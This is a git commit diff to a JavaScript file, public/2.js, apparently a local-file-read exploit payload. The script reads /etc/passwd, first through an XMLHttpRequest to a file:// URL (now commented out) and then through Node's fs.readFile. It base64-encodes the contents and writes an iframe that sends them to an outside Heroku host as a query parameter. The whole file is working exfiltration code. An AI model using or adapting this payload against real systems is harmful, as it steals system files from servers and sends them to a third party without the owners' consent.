bdc6e824caf48a57ad0bffa1084210b042876662
Bohdan Pantiukhov <58185639+gingermanymph@users.noreply.github.com>
2021-03-10 21:07:24 +0200

    Update 2.js

--- public/2.js
+++ public/2.js
@@ -1,10 +1,19 @@
-function reqListener () {
+function reqListener (a) {
     var encoded = encodeURI(this.responseText);
-    var b64 = btoa(this.responseText);
+    var b64 = btoa(a);//this.responseText);
     var raw = this.responseText;
     document.write('<iframe src="http://srvcb.herokuapp.com/?data='+b64+'"></iframe>');
 } 
-var oReq = new XMLHttpRequest(); 
-oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
-oReq.send();
+// var oReq = new XMLHttpRequest(); 
+// oReq.addEventListener("load", reqListener); 
+// oReq.open("GET", "file:///etc/passwd"); 
+// oReq.send();
+
+var path = "file:///etc/passwd"
+var fs = require('fs')
+fs.readFile(path , 'utf8', function(err, data) {
+  if (err) throw err;
+    reqListener(data)
+//   console.log('OK: ' + filename);
+//   console.log(data)
+});
